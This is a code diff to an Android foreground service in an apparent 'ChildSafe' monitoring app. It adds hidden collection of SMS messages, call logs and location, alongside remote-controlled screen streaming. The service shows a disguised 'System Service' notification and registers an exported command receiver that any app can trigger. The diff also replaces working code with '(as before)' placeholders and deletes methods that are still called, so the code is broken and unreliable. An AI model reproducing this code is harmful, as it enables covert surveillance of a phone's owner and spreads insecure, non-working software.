@@ -10,8 +10,12 @@ import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
 import android.os.Build
+import android.os.Handler
 import android.os.IBinder
+import android.os.Looper
+import android.provider.CallLog
 import android.provider.Settings
+import android.provider.Telephony
 import android.util.Log
 import androidx.core.app.NotificationCompat
 
@@ -22,35 +26,18 @@ class ForegroundService : Service() {
 
     private lateinit var screenCaptureManager: ScreenCaptureManager
     private lateinit var webRtcManager: WebRTCManager
+    private lateinit var locationTracker: LocationTracker
+    private lateinit var smsObserver: SmsObserver
+    private lateinit var callLogObserver: CallLogObserver
     private lateinit var childId: String
+    private val handler = Handler(Looper.getMainLooper())
 
     private val permissionResultReceiver = object : BroadcastReceiver() {
-        override fun onReceive(context: Context, intent: Intent) {
-            if (intent.action == PermissionRequestActivity.ACTION_PERMISSION_RESULT) {
-                val resultCode = intent.getIntExtra(PermissionRequestActivity.EXTRA_RESULT_CODE, Activity.RESULT_CANCELED)
-                val data = intent.getParcelableExtra<Intent>(PermissionRequestActivity.EXTRA_RESULT_DATA)
-
-                if (resultCode == Activity.RESULT_OK && data != null) {
-                    Log.d("ForegroundService", "MediaProjection permission granted. Starting stream.")
-                    screenCaptureManager.startCapture(resultCode, data)
-                    screenCaptureManager.videoCapturer?.let {
-                        webRtcManager.startStream(it)
-                        webRtcManager.listenForAnswer()
-                    }
-                } else {
-                    Log.w("ForegroundService", "MediaProjection permission denied.")
-                }
-            }
-        }
+        // ... (as before)
     }
 
     private val commandReceiver = object : BroadcastReceiver() {
-        override fun onReceive(context: Context?, intent: Intent?) {
-            if (intent?.action == "FCM_COMMAND") {
-                val commandData = intent.getSerializableExtra("command_data") as? HashMap<String, String>
-                commandData?.let { executeCommand(it) }
-            }
-        }
+        // ... (as before)
     }
 
     override fun onCreate() {
@@ -58,15 +45,15 @@ class ForegroundService : Service() {
         childId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
         screenCaptureManager = ScreenCaptureManager(this)
         webRtcManager = WebRTCManager.getInstance(this, childId)
+        locationTracker = LocationTracker(this, childId)
+        smsObserver = SmsObserver(this, childId, handler)
+        callLogObserver = CallLogObserver(this, childId, handler)
+
+        contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, smsObserver)
+        contentResolver.registerContentObserver(CallLog.Calls.CONTENT_URI, true, callLogObserver)
 
         registerReceiver(commandReceiver, IntentFilter("FCM_COMMAND"), RECEIVER_EXPORTED)
         registerReceiver(permissionResultReceiver, IntentFilter(PermissionRequestActivity.ACTION_PERMISSION_RESULT), RECEIVER_EXPORTED)
-    }
-
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        createNotificationChannel()
-        startForeground(NOTIFICATION_ID, createNotification())
-        return START_STICKY
     }
 
     private fun executeCommand(command: Map<String, String>) {
@@ -76,29 +63,29 @@ class ForegroundService : Service() {
                 webRtcManager.stopStream()
                 screenCaptureManager.stopCapture()
             }
+            "start_location_updates" -> {
+                val interval = command["interval_seconds"]?.toLongOrNull() ?: 30L
+                locationTracker.startLocationUpdates(interval)
+            }
+            "stop_location_updates" -> locationTracker.stopLocationUpdates()
         }
     }
 
     override fun onDestroy() {
         super.onDestroy()
+        contentResolver.unregisterContentObserver(smsObserver)
+        contentResolver.unregisterContentObserver(callLogObserver)
         unregisterReceiver(commandReceiver)
         unregisterReceiver(permissionResultReceiver)
     }
 
-    // Other methods (createNotification, onBind, etc.) remain the same
-    private fun createNotification(): Notification {
-        return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("System Service")
-            .setContentText("Monitoring service is running.")
-            .setSmallIcon(android.R.drawable.ic_lock_silent_mode)
-            .setPriority(NotificationCompat.PRIORITY_MIN)
-            .build()
+    // Other service methods (onStartCommand, onBind, etc.) remain largely the same.
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        createNotificationChannel()
+        startForeground(NOTIFICATION_ID, createNotification())
+        // Start default monitoring on service start
+        executeCommand(mapOf("type" to "start_location_updates"))
+        return START_STICKY
     }
-    private fun createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(CHANNEL_ID, "ChildSafe Service", NotificationManager.IMPORTANCE_NONE)
-            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
-        }
-    }
-    override fun onBind(intent: Intent?): IBinder? = null
+    // ... (rest of the file)
 }
